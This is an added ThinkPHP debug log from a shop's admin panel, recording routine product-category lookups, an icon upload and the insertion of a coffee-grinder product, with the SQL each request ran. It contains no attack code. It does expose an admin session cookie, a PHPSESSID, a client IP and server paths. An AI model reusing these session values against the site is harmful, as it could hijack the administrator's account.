+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.006185s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.006074s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.005899s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.005997s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.005941s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.006059s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.005922s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.005999s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.005632s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.005707s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.005556s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.005518s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.005476s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.005608s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.005543s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.005606s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.005503s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.005728s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.005583s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.005605s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.005574s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.001120s ]
+[ sql ] [ SQL ] SELECT * FROM `user` WHERE  `user` = 'admin' [ RunTime:0.000463s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `seo` [ RunTime:0.001166s ]
+[ sql ] [ SQL ] SELECT * FROM `seo` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000354s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webplug` [ RunTime:0.000825s ]
+[ sql ] [ SQL ] SELECT * FROM `webplug` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000249s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `danyecon` [ RunTime:0.000691s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` [ RunTime:0.000245s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` WHERE  `class` = '备忘录' [ RunTime:0.000215s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:17:31+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/newsclass?formname=productc
+[运行时间：0.030848s] [吞吐率：32.42req/s] [内存消耗：2,730.16kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'newsclass',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=upproduct&formname=product',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => '*/*',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '0',
+  'host' => 'aosuper.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->newsclass[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000560s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.003163s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` WHERE  `parent_id` = '0' [ RunTime:0.000916s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:17:31+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/newsTree?formname=productc
+[运行时间：0.106778s] [吞吐率：9.37req/s] [内存消耗：3,812.49kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'newsTree',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=upproduct&formname=product',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => '*/*',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '0',
+  'host' => 'aosuper.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->newsTree[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000671s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001093s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` [ RunTime:0.001781s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:18:14+08:00 ] 179.134.4.167 POST aosuper.com/login.php/admin/basicicoapi
+[运行时间：0.037107s] [吞吐率：26.95req/s] [内存消耗：2,873.49kb] [文件加载：51]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'admin',
+    2 => 'basicicoapi',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=upproduct&formname=product',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-type' => 'multipart/form-data; boundary=----WebKitFormBoundarycGgwjpPzm0HzJvtt',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '679532',
+  'host' => 'aosuper.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Admin->basicicoapi[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Admin.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000697s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001089s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.006013s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:18:34+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/upnews?formname=product
+[运行时间：0.029034s] [吞吐率：34.44req/s] [内存消耗：2,712.59kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'upnews',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=upproduct&formname=product',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '580',
+  'host' => 'aosuper.com',
+)
+[ info ] [ PARAM ] array (
+  'formname' => 'product',
+  'news_tit' => 'MOEDOR DE CAFÉ MANUAL',
+  'news_slt' => '/static/upload_img/admin/ico/20240613/325e191cbf6e87da6f65e8cd0f37ec97.png',
+  'newsclass' => 'UTENSÍLIOS DE COZINHA',
+  'newstime' => '',
+  'srcimg' => '[]',
+  'jiage' => '40.00',
+  'yijia' => 'MOEDOR DE CAFÉ MANUAL',
+  'editor' => '<p>MOEDOR DE CAFÉ MANUAL</p>',
+  'yanse' => '{}',
+  'xinghao' => 
+  array (
+    0 => '{"0":"MOEDOR DE CAFÉ MANUAL","1":"40.00"}',
+  ),
+  'ejclass' => 
+  array (
+    0 => 'UTENSÍLIOS DE COZINHA',
+    1 => 'MOEDOR DE CAFÉ',
+    2 => 'MANUAL',
+  ),
+  'sjclass' => 
+  array (
+    0 => 'UTENSÍLIOS DE COZINHA',
+    1 => 'MOEDOR DE CAFÉ',
+    2 => 'MANUAL',
+  ),
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->upnews[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000815s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `product` [ RunTime:0.001309s ]
+[ sql ] [ SQL ] SELECT * FROM `product` WHERE  `id` = '' [ RunTime:0.000414s ]
+[ sql ] [ SQL ] INSERT INTO `product` (`Id` , `news_tit` , `news_jj` , `news_slt` , `news_editor` , `newsclass` , `srcimg` , `newstime` , `newssort` , `classitem` , `daqu` , `leixing` , `bianhao` , `jiage` , `yijia` , `menpai` , `ifpay` , `xingbie` , `taocan` , `zhlx` , `dengji` , `xinghao` , `yanse` , `ejclass` , `sjclass`) VALUES (0 , 'MOEDOR DE CAFÉ MANUAL' , '' , '/static/upload_img/admin/ico/20240613/325e191cbf6e87da6f65e8cd0f37ec97.png' , '<p>MOEDOR DE CAFÉ MANUAL</p>' , 'UTENSÍLIOS DE COZINHA' , '[]' , '2024-06-13' , 0 , '' , '' , '' , '' , '40.00' , 'MOEDOR DE CAFÉ MANUAL' , '' , '' , '' , '\"\"' , '' , '' , '[\"{\\\"0\\\":\\\"MOEDOR DE CAF\\u00c9 MANUAL\\\",\\\"1\\\":\\\"40.00\\\"}\"]' , '\"{}\"' , '[\"UTENS\\u00cdLIOS DE COZINHA\",\"MOEDOR DE CAF\\u00c9\",\"MANUAL\"]' , '[\"UTENS\\u00cdLIOS DE COZINHA\",\"MOEDOR DE CAF\\u00c9\",\"MANUAL\"]') [ RunTime:0.000485s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:18:36+08:00 ] 179.134.4.167 GET aosuper.com/login.php/admin/loadright?page=product
+[运行时间：0.462326s] [吞吐率：2.16req/s] [内存消耗：3,480.75kb] [文件加载：53]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'admin',
+    2 => 'loadright',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73',
+  'priority' => 'u=0, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=upproduct&formname=product',
+  'sec-fetch-dest' => 'iframe',
+  'sec-fetch-user' => '?1',
+  'sec-fetch-mode' => 'navigate',
+  'sec-fetch-site' => 'same-origin',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'sec-ch-ua-platform' => '"Windows"',
+  'sec-ch-ua-mobile' => '?0',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'page' => 'product',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Admin->loadright[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Admin.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/admin/view/admin/table/product.html [ array (
+  0 => 'languageObj',
+  1 => 'language',
+  2 => 'userid',
+  3 => 'user',
+  4 => 'password',
+  5 => 'ico',
+  6 => 'username',
+  7 => 'companyname',
+  8 => 'webname',
+  9 => 'domain',
+  10 => 'Address',
+  11 => 'person',
+  12 => 'mobile',
+  13 => 'qq',
+  14 => 'Introduction',
+  15 => 'tippw',
+  16 => 'weblogo',
+  17 => 'seowebname',
+  18 => 'seowebdomain',
+  19 => 'seoseotitle',
+  20 => 'seoseokey',
+  21 => 'seoseodsc',
+  22 => 'seoseoheader',
+  23 => 'jstwo',
+  24 => 'jsone',
+  25 => 'url',
+  26 => 'danyecon',
+  27 => 'num',
+  28 => 'webdomain',
+  29 => 'appid',
+  30 => 'miyao',
+  31 => 'fxtit',
+  32 => 'fxms',
+  33 => 'wxtit',
+  34 => 'Hamtime',
+  35 => 'photo',
+  36 => 'wxms',
+  37 => 'photowx',
+  38 => 'viewUV',
+  39 => 'loginnum',
+  40 => 'alluv',
+  41 => 'allmb',
+  42 => 'allorder',
+  43 => 'allkc',
+  44 => 'acviewnum',
+  45 => 'pdviewnum',
+  46 => 'notes',
+  47 => 'productc',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000807s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001117s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.006522s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `language` [ RunTime:0.000967s ]
+[ sql ] [ SQL ] SELECT * FROM `language` ORDER BY `create_at` DESC [ RunTime:0.001552s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webpv` > 0 ORDER BY `Id` DESC [ RunTime:0.048750s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `member` [ RunTime:0.003722s ]
+[ sql ] [ SQL ] SELECT * FROM `member` ORDER BY `Id` DESC [ RunTime:0.000571s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `order` [ RunTime:0.001047s ]
+[ sql ] [ SQL ] SELECT * FROM `order` ORDER BY `Id` DESC [ RunTime:0.004666s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `news` [ RunTime:0.001516s ]
+[ sql ] [ SQL ] SELECT * FROM `news` ORDER BY `Id` DESC [ RunTime:0.000531s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-01'  AND `webpv` > 0 [ RunTime:0.007407s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-02'  AND `webpv` > 0 [ RunTime:0.007129s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-03'  AND `webpv` > 0 [ RunTime:0.007332s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-04'  AND `webpv` > 0 [ RunTime:0.007912s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-05'  AND `webpv` > 0 [ RunTime:0.008017s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06'  AND `webpv` > 0 [ RunTime:0.007835s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-07'  AND `webpv` > 0 [ RunTime:0.007224s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08'  AND `webpv` > 0 [ RunTime:0.006699s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09'  AND `webpv` > 0 [ RunTime:0.006625s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-10'  AND `webpv` > 0 [ RunTime:0.006601s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-11'  AND `webpv` > 0 [ RunTime:0.006580s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-12'  AND `webpv` > 0 [ RunTime:0.006620s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-01' [ RunTime:0.006034s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-02' [ RunTime:0.005986s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-03' [ RunTime:0.006118s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-04' [ RunTime:0.006130s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-05' [ RunTime:0.006072s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-06' [ RunTime:0.005944s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-07' [ RunTime:0.006096s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-08' [ RunTime:0.006084s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-09' [ RunTime:0.005915s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-10' [ RunTime:0.006151s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-11' [ RunTime:0.006038s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-12' [ RunTime:0.006069s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006267s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.006243s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.006434s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.006330s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.007000s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.006465s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.006426s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.006324s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.006315s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.006504s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.006442s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.006487s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006181s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.006015s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.006121s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.006010s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.005967s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.006050s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.005833s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.005929s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.005918s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.005945s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.005924s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.005781s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.005513s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.001031s ]
+[ sql ] [ SQL ] SELECT * FROM `user` WHERE  `user` = 'admin' [ RunTime:0.000361s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `seo` [ RunTime:0.001171s ]
+[ sql ] [ SQL ] SELECT * FROM `seo` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000362s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webplug` [ RunTime:0.000817s ]
+[ sql ] [ SQL ] SELECT * FROM `webplug` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000267s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `danyecon` [ RunTime:0.000773s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` [ RunTime:0.000266s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` WHERE  `class` = '备忘录' [ RunTime:0.000268s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.000859s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` WHERE  `parent_id` = '0' [ RunTime:0.000715s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:18:36+08:00 ] 179.134.4.167 GET aosuper.com/login.php/newsad/prolist?page=1&limit=15
+[运行时间：0.041663s] [吞吐率：24.00req/s] [内存消耗：2,748.34kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'prolist',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=product',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'page' => '1',
+  'limit' => '15',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->prolist[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
